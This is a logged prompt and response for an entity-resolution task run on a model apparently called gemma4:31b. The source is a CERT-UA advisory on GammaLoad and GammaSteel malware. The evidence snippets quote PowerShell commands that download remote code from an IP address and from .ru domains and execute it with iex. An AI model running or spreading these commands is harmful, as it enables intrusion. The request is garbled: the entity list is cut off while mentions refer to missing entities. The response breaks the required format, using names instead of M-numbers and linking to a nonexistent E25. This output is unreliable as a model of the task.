=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
M27. "pasamart.ru" (Domain) — options: E39, E37, E84, E44
M28. "qkcew.ru" (Domain) — options: E69, E37, E91, E52
M29. "rncsq.ru" (Domain) — options: E39, E37, E93, E42
M30. "tarlit.ru" (Domain) — options: E41, E65, E37, E39
M31. "tbwelo.ru" (Domain) — options: E52, E37, E43, E79
M32. "wicksl.ru" (Domain) — options: E44, E37, E72, E42
M33. "xcqef.ru" (Domain) — options: E39, E37, E81, E42
M34. "nxkad.ru" (Domain) — options: E92, E80, E37, E39 — ctx: S7
M35. "dnslookup.seowebchecker.com" (Domain) — options: E97, E98, E99, E100
M36. "tools.nexcess.net" (Domain) — options: E106, E107, E108, E109
M37. "viewdns.info" (Domain) — options: E114, E97, E108, E116
M38. "www.portcheckers.com" (Domain) — options: E120, E121, E49, E60 — ctx: S7

=== RESPONSE (29.6s, in 4350 / out 5492 tok, stop) ===
{"m":"GammaSteel.PS1","id":"NEW","g":"a PowerShell implementation of HarvesterX used for file theft"}
{"m":"GammaSteel.NET","id":"NEW","g":"used for stealing browser authentication data"}
{"m":"HarvesterX","id":"NEW","g":"software previously used by the attackers"}
{"m":"PowerShell (powershell.exe)","id":"E25","g":null}
{"m":"lover.printing82.detroito.ru","id":"NEW","g":null}
{"m":"atlantar.ru","id":"NEW","g":null}
{"m":"motoristo.ru","id":"NEW","g":null}
{"m":"moolin.ru","id":"NEW","g":null}
{"m":"bubenci.ru","id":"NEW","g":null}
{"m":"callsol.ru","id":"NEW","g":null}
{"m":"clipperso.ru","id":"NEW","g":null}
{"m":"cooperi.ru","id":"NEW","g":null}
{"m":"detroito.ru","id":"NEW","g":null}
{"m":"farafauler.ru","id":"NEW","g":null}
{"m":"flayga.ru","id":"NEW","g":null}
{"m":"ganara.ru","id":"NEW","g":null}
{"m":"hawksi.ru","id":"NEW","g":null}
{"m":"hofsteder.ru","id":"NEW","g":null}
{"m":"kilitro.ru","id":"NEW","g":null}
{"m":"kurapat.ru","id":"NEW","g":null}
{"m":"lnasfe.ru","id":"NEW","g":null}
{"m":"lopasts.ru","id":"NEW","g":null}
{"m":"mafirti.ru","id":"NEW","g":null}
{"m":"metanat.ru","id":"NEW","g":null}
{"m":"mitlubald.ru","id":"NEW","g":null}
{"m":"paparat.ru","id":"NEW","g":null}
{"m":"pasamart.ru","id":"NEW","g":null}
{"m":"qkcew.ru","id":"NEW","g":null}
{"m":"rncsq.ru","id":"NEW","g":null}
{"m":"tarlit.ru","id":"NEW","g":null}
{"m":"tbwelo.ru","id":"NEW","g":null}
{"m":"wicksl.ru","id":"NEW","g":null}
{"m":"xcqef.ru","id":"NEW","g":null}
{"m":"nxkad.ru","id":"NEW","g":null}
{"m":"dnslookup.seowebchecker.com","id":"NEW","g":null}
{"m":"tools.nexcess.net","id":"NEW","g":null}
{"m":"viewdns.info","id":"NEW","g":null}
{"m":"www.portcheckers.com","id":"NEW","g":null}
